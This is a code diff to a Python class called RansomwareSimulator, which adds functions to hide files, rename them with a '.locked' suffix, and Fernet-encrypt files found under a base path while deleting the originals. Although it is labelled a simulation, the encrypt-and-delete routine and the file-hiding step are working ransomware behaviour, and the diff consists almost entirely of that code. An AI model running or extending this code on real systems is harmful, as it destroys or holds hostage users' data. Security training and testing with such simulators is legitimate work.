@@ -1,4 +1,6 @@
 import os
+import time
+import ctypes
 import base64
 import platform
 from pathlib import Path
@@ -12,6 +14,47 @@ class RansomwareSimulator:
     def __init__(self):
         self.simulation = False
         self.base_path = None
+
+    @staticmethod
+    def hide_file(filepath):
+        """Hide file on Windows (simulate locker)"""
+        system = platform.system()
+        if system == "Windows":
+            FILE_ATTRIBUTE_HIDDEN = 0x02
+            ctypes.windll.kernel32.SetFileAttributesW(str(filepath), FILE_ATTRIBUTE_HIDDEN)
+        elif system == "Linux" or system == "Darwin":
+            dirname, filename = os.path.split(filepath)
+            if not filename.startswith('.'):
+                os.rename(filepath, os.path.join(dirname, '.' + filename))
+
+    @staticmethod
+    def lock_files_temporarily(file_list, duration=5):
+        """
+        Simulate temporary lock by renaming files with a lock prefix
+        and restoring them after `duration` seconds.
+        """
+        locked = []
+        for file in file_list:
+            locked_name = file + ".locked"
+            os.rename(file, locked_name)
+            locked.append((locked_name, file))
+            print(f"[LOCKED] {file}")
+
+        time.sleep(duration)
+
+        for locked_name, original_name in locked:
+            os.rename(locked_name, original_name)
+            print(f"[UNLOCKED] {original_name}")
+
+    @staticmethod
+    def encrypt_file(filepath, key):
+        f = Fernet(key)
+        with open(filepath, 'rb') as file:
+            original = file.read()
+        encrypted = f.encrypt(original)
+        with open(filepath + '.enc', 'wb') as file:
+            file.write(encrypted)
+        os.remove(filepath)
 
     @staticmethod
     def generate_key(password: str, salt_file="salt.bin"):
@@ -32,16 +75,6 @@ class RansomwareSimulator:
         )
         key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
         return key
-
-    @staticmethod
-    def encrypt_file(filepath, key):
-        f = Fernet(key)
-        with open(filepath, 'rb') as file:
-            original = file.read()
-        encrypted = f.encrypt(original)
-        with open(filepath + '.enc', 'wb') as file:
-            file.write(encrypted)
-        os.remove(filepath)
 
     @staticmethod
     def decrypt_file(filepath, key):
@@ -129,6 +162,7 @@ class RansomwareSimulator:
         print(f"[INFO] AES key derived using stored salt.")
 
         files = self.find_files(base_path)
+        self.lock_files_temporarily(files, duration=10)
         for f in files:
             self.encrypt_file(f, key)
             print(f"[ENCRYPTED] {f}")
@@ -141,6 +175,3 @@ class RansomwareSimulator:
         files = self.find_files(path)
         for f in files:
             self.encrypt_file(f, key)
-
-
-# Ransomware().drop_ransom_note()
